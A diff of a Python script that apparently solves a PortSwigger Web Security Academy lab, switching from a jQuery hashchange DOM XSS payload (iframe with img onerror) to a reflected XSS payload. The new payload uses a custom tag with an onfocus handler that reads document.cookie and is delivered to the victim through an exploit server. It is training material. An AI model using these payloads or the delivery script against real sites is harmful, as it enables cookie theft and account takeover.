@@ -2,14 +2,14 @@
 #
 # Author: Ahmed Elqalaawy (@elqal3awii)
 #
-# Date: 15/11/2023
+# Date: 22/11/2023
 #
-# Lab: DOM XSS in jQuery selector sink using a hashchange event
+# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 #
-# Steps: 1. Craft an iframe that, when loaded, will append an img element to the hash part
-#           of the URL
+# Steps: 1. Craft a script that will redirect the victim to the vulnerable website with 
+#           the injected payload in the search query parameter
 #        2. Deliver the exploit to the victim
-#        3. The print() function will be called after they trigger the exploit
+#        3. The alert() function will be called after they trigger the exploit
 #
 ##############################################################################################
 
@@ -26,16 +26,18 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-lab_url = "https://0ab900a5034d97b984d805e7005900b0.web-security-academy.net"
+lab_url = "https://0a2000a004e4a56182a1705f005f001f.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0aef0040033b970f84f4041c01b0006c.exploit-server.net"
+exploit_server_url = "https://exploit-0ad000370420a54782b26f4a01a3008c.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
 
-# payload to call the alert() function
-payload = f"""<iframe src="{lab_url}/#" onload="this.src+='<img src=1 onerror=print()>'">"""
+# payload to call the alert function
+payload = f"""<script>
+                location = "{lab_url}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
+            </script>"""
 
 # data to send via POST
 data = {
@@ -55,7 +57,7 @@ except:
     exit(1)
 
 print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
-print(Fore.WHITE + "🗹 The print() function will be called after they trigger the exploit") 
+print(Fore.WHITE + "🗹 The alert() function will be called after they trigger the exploit") 
 print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
 
 
